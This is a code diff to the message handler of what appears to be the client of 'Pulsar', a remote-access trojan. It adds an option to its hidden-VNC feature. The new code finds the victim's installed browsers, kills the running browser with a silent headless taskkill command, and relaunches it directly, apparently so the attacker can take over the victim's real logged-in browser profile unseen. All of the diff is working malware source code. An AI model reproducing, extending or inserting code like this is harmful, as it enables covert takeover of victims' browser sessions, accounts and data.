@@ -298,6 +298,30 @@ namespace Pulsar.Client.Messages
         private void Execute(ISender client, StartHVNCProcess message)
         {
             string name = message.Path;
+            bool dontCloneProfile = message.DontCloneProfile;
+
+            var browserPaths = new Dictionary<string, string>
+            {
+                { "Chrome", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Google\\Chrome\\Application\\chrome.exe" },
+                { "Edge", Environment.GetEnvironmentVariable("PROGRAMFILES(X86)") + "\\Microsoft\\Edge\\Application\\msedge.exe" },
+                { "Brave", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" },
+                { "Opera", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Opera\\launcher.exe" },
+                { "OperaGX", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Opera GX\\launcher.exe" },
+                { "Mozilla", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\firefox.exe" }
+            };
+
+            if (dontCloneProfile && browserPaths.TryGetValue(name, out string executablePath) && File.Exists(executablePath))
+            {
+                string browserProcess = name.ToLower().Replace("mozilla", "firefox");
+                string killCommand = $"Conhost --headless cmd.exe /c taskkill /IM {browserProcess}.exe /F";
+                ProcessHandler.CreateProc(killCommand);
+                Thread.Sleep(1000);
+                
+                Debug.WriteLine($"Direct starting browser: {executablePath}");
+                ProcessHandler.CreateProc(executablePath);
+                return;
+            }
+
             var processActions = new Dictionary<string, Action>
             {
                 { "Chrome", ProcessHandler.Startchrome },
